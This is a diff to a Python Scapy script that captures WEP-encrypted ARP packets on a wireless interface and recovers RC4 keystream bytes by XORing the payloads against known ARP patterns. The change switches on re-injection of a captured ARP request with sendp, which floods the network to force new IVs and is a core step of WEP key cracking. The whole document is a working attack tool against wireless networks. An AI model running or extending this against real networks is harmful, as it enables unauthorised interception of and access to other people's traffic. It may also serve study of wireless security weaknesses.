@@ -1,3 +1,7 @@
+# NOTE
+# When re-injecting, it is possible the NIC is not sniffing, not sure
+# 50% chance IV repeats after 5000 packets
+
 from scapy.all import *
 import binascii
 from argparse import ArgumentParser as AP
@@ -9,7 +13,6 @@ keystreams = {}
 re_injection_packet = None
 arp_packets_captured = 0
 iface = 'wlan0'
-source_mac = ''
 
 # Don't think we want this cause then we can't keep track of how many packets we have
 # t = AsyncSniffer()
@@ -25,23 +28,15 @@ def expand(x):
         yield x.name
 
 
-# TODO Continuously inject a captured ARP request packet into the network
-#   Not sure if this is possible because the card might be locked while sniffing?
-# 50% chance IV repeats after 5000 packets
-
-
 def arp_monitor_callback(pkt):
     global re_injection_packet
     global arp_packets_captured
     global iface
-    global source_mac
     if len(pkt) == 112 or len(pkt) == 110:
         # print(pkt[RadioTap].len)
         layers = list(expand(pkt))
         if '802.11 WEP packet' in layers:
             arp_packets_captured += 1
-            print(arp_packets_captured)
-            # pkt.show()
             src_address = pkt.addr2
             bssid = pkt.addr1
             iv_bytes = binascii.hexlify(pkt.iv)
@@ -54,21 +49,21 @@ def arp_monitor_callback(pkt):
             if pkt.addr3 == 'ff:ff:ff:ff:ff:ff':
                 if re_injection_packet is None:
                     re_injection_packet = pkt
-                # FIXME Have this on a new thread?
-                # FIXME Spawn the new thread once this is not None
-                if re_injection_packet is not None:
-                    re_injection_packet.addr2 = source_mac
-                    # sendp(re_injection_packet, iface=iface, count=20, inter=0.100)
                 xor = data_dec ^ int(ARP_REQUEST_PATTERN, 16)
                 keystream_first_bytes = hex(xor)[2:]
                 if iv_hexstring not in keystreams:
                     keystreams[iv_hexstring] = keystream_first_bytes
+                # TODO Does not need to be on a new thread, but could potentially speed things up
+                if re_injection_packet is not None:
+                    sendp(re_injection_packet, iface=iface, count=3, inter=0.100)
             # ARP response
             else:
                 xor = data_dec ^ int(ARP_RESPONSE_PATTERN, 16)
                 keystream_first_bytes = hex(xor)[2:]
                 if iv_hexstring not in keystreams:
                     keystreams[iv_hexstring] = keystream_first_bytes
+                if re_injection_packet is not None:
+                    sendp(re_injection_packet, iface=iface, count=3, inter=0.100)
 
 
 def stop_condition(pkt):
@@ -79,15 +74,12 @@ def stop_condition(pkt):
 if __name__ == "__main__":
     parser = AP(description="Capture ARP packets and exctract the RC4 keystream.")
     parser.add_argument("-i", "--interface",help="interface to sniff and send packets from")
-    parser.add_argument("-s", "--source_mac",help="MAC address of device sending packets")
     args = parser.parse_args()
-    if args.interface is None or args.source_mac is None:
+    if args.interface is None:
         print("[-] Please specify all program arguments... run `python3 sniffer.py -h` for help")
         exit(1)
     iface = args.interface
-    source_mac = args.source_mac
 
-    # sniff(iface="wlp7s0", prn=arp_monitor_callback, filter="arp", store=0)
     sniff(iface=iface, prn=arp_monitor_callback, store=0, stop_filter=stop_condition)
     
     # scapy_cap = rdpcap('packets/arp_packet_dump.pcap')
